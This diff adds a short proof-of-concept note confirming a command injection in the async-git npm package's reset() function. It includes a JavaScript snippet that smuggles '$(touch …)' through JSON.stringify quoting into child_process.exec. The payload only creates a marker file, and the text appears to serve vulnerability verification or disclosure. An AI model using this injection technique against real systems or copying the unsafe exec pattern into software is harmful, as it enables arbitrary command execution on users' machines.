@@ -1,0 +1,25 @@
+Confirmed the command injection in `async-git`'s `reset()` — it builds a shell command with `JSON.stringify()` (which doesn't neutralize `$()` command substitution in double-quoted POSIX shell strings) and passes it to `child_process.exec`.
+
+```javascript
+const git = require("async-git");
+const fs = require("fs");
+const os = require("os");
+const path = require("path");
+
+// async-git's reset() builds: `git reset "<input>" --hard` and runs it via
+// child_process.exec (a real shell). It "escapes" the input with
+// JSON.stringify(), but double quotes do NOT stop $() command substitution
+// in POSIX shells, so arbitrary commands execute before git even runs.
+
+const marker = path.join(os.tmpdir(), `pwned-${Date.now()}.txt`);
+
+git.reset(`$(touch ${marker})`)
+  .catch(() => {}) // git itself will fail on the resulting empty pathspec; irrelevant
+  .finally(() => {
+    console.log(
+      fs.existsSync(marker)
+        ? `VULNERABLE: command injection executed -> ${marker}`
+        : "NOT vulnerable"
+    );
+  });
+```
